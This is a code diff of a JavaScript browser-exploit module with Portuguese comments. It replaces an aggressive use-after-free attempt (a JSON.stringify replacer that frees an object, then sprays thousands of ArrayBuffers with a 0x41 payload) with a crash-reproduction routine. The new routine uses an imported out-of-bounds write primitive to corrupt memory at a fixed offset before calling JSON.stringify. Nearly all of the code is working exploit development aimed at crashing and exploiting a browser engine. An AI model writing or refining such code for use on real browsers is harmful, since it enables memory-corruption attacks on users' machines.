@@ -1,64 +1,68 @@
-// js/script3/testMemoryLeakViaJsonTC.mjs (ESTRATÉGIA: UAF AGRESSIVO)
+// js/script3/testMemoryLeakViaJsonTC.mjs (ESTRATÉGIA: REPRODUZIR CRASH INICIAL)
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
+import { toHex, AdvancedInt64 } from '../utils.mjs';
+import {
+    triggerOOB_primitive,
+    oob_write_absolute,
+    clearOOBEnvironment
+} from '../core_exploit.mjs';
 
-// --- Configuração para Exploit de UAF Agressivo ---
-const UAF_CONFIG = {
-    // Vamos tentar realocar com vários tamanhos para aumentar a chance de acertar.
-    RECLAIM_BUFFER_SIZES: [48, 56, 64, 72, 80],
-    // Vamos pulverizar milhares de buffers para forçar o GC e ocupar o espaço.
-    RECLAIM_SPRAY_COUNT: 4000,
-    // Nosso payload. Se o motor tentar usar isso como um ponteiro, irá crashar.
-    RECLAIM_PAYLOAD: 0x4141414141414141n,
+// --- Configuração para Reprodução de Crash ---
+const CRASH_REPRO_CONFIG = {
+    // Offset que provavelmente causou o crash nos testes iniciais.
+    corruption_offset: 0x70,
+    
+    // Valor clássico para corrupção de ponteiros ou metadados.
+    corruption_value: 0xffffffff,
+
+    // O objeto que passaremos para JSON.stringify para acionar a vulnerabilidade.
+    victim_ab_size: 64,
 };
 // --- Fim dos Parâmetros ---
 
-// Mantemos uma referência global aos buffers para que eles não sejam coletados cedo demais.
-let reclaim_spray_holder = [];
+export async function reproduceInitialCrash() {
+    const FNAME = "reproduceInitialCrash";
+    logS3(`--- Iniciando Tentativa de Reprodução do Crash Original ---`, "test", FNAME);
+    logS3(`   Alvo de Corrupção: Offset ${toHex(CRASH_REPRO_CONFIG.corruption_offset)} com valor ${toHex(CRASH_REPRO_CONFIG.corruption_value)}`, 'info', FNAME);
 
-export async function testUafExploit() {
-    const FNAME = "testUafExploit";
-    logS3(`--- Iniciando Tentativa de Exploração UAF Agressiva ---`, "test", FNAME);
-    logS3(`   Alvos de Realocação: ${UAF_CONFIG.RECLAIM_SPRAY_COUNT} buffers para cada tamanho em [${UAF_CONFIG.RECLAIM_BUFFER_SIZES.join(', ')}]`, 'info', FNAME);
+    await triggerOOB_primitive();
+    if (!oob_write_absolute) {
+        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME);
+        return;
+    }
 
-    let victim_obj = { data: 0xDEADBEEF };
-    let container = [victim_obj, victim_obj];
-    let uaf_triggered = false;
+    // Criamos um objeto vítima simples.
+    let victim_ab = new ArrayBuffer(CRASH_REPRO_CONFIG.victim_ab_size);
+    logS3(`ArrayBuffer vítima (${CRASH_REPRO_CONFIG.victim_ab_size} bytes) criado.`, "info", FNAME);
 
-    const replacer = (key, value) => {
-        if (key === '0' && !uaf_triggered) {
-            uaf_triggered = true; // Prevenir re-execução
-            logS3("[Replacer] Gatilho ativado. Removendo referência e iniciando pulverização massiva...", "warn", FNAME);
-            
-            container[1] = null; // Torna o objeto elegível para GC
-
-            // Etapa de Pressão e Realocação Agressiva
-            reclaim_spray_holder = [];
-            for (const size of UAF_CONFIG.RECLAIM_BUFFER_SIZES) {
-                for (let i = 0; i < UAF_CONFIG.RECLAIM_SPRAY_COUNT; i++) {
-                    let reclaim_buffer = new ArrayBuffer(size);
-                    let view = new BigUint64Array(reclaim_buffer);
-                    // Preenche o início de cada buffer com nosso payload.
-                    if (view.length > 0) {
-                        view[0] = UAF_CONFIG.RECLAIM_PAYLOAD;
-                    }
-                    reclaim_spray_holder.push(reclaim_buffer);
-                }
-            }
-            logS3(`[Replacer] Pulverização concluída. ${reclaim_spray_holder.length} buffers criados.`, "good", FNAME);
-            logS3("[Replacer] Se o UAF for bem-sucedido, o navegador deve travar agora.", "vuln", FNAME);
-        }
-        return value;
-    };
-
-    logS3("Chamando JSON.stringify para acionar a condição de UAF...", "info", FNAME);
+    // Etapa 1: Corromper a memória no offset conhecido.
+    logS3("Realizando a escrita Out-of-Bounds (OOB) para corromper a memória...", "warn", FNAME);
     try {
-        JSON.stringify(container, replacer);
-        logS3("--- JSON.stringify completou sem travar. ---", "warn", FNAME);
-        logS3("   Causas prováveis: (1) O GC não executou no momento certo. (2) A vulnerabilidade não está presente neste caminho.", "info", FNAME);
+        oob_write_absolute(CRASH_REPRO_CONFIG.corruption_offset, CRASH_REPRO_CONFIG.corruption_value, 4);
+    } catch (e) {
+        logS3(`Falha crítica ao escrever OOB: ${e.message}`, "error", FNAME);
+        clearOOBEnvironment();
+        return;
+    }
+    
+    await PAUSE_S3(100);
+
+    // Etapa 2: Chamar a função que aciona o uso da memória corrompida.
+    // O SINAL DE SUCESSO É O CRASH DO NAVEGADOR NESTE PONTO.
+    logS3("Chamando JSON.stringify(victim_ab)... Se o exploit for bem-sucedido, o navegador irá travar agora.", "vuln", FNAME);
+
+    try {
+        JSON.stringify(victim_ab);
+        
+        // Se o código chegar aqui, o crash não ocorreu.
+        logS3("--- FALHA ---", "warn", FNAME);
+        logS3("JSON.stringify completou sem travar. O estado vulnerável não foi alcançado.", "warn", FNAME);
 
     } catch (e) {
-        logS3(`--- SUCESSO INESPERADO: JSON.stringify CRASHOU com um erro tratável! ---`, "vuln", FNAME);
-        logS3(`   -> Erro: ${e.message}`, "vuln", FNAME);
-        logS3("   -> Este é um resultado muito positivo, indicando um UAF controlado.", "info", FNAME);
+        logS3(`--- SUCESSO PARCIAL ---`, "good", FNAME);
+        logS3(`Ocorreu um erro tratável em vez de um crash: ${e.message}`, "good", FNAME);
+        logS3("Isso ainda é um resultado útil e pode ser explorável.", "info", FNAME);
+    } finally {
+        clearOOBEnvironment();
     }
 }
